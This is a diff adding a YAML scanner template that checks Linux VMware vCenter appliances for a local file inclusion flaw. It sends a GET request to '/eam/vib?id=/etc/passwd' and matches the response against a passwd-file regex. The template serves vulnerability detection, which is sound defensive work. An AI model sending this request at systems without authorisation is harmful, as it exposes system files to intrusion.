@@ -1,0 +1,25 @@
+id: "vmware-vcenter-lfi-linux"
+name: "Linux Vmware Vcenter - Local File Inclusion"
+severity: "high"
+description: "Linux appliance based Vmware Vcenter is vulnerable to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "vmware"
+  - "lfi"
+  - "vcenter"
+  - "linux"
+  - "vuln"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/eam/vib?id=/etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "or"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
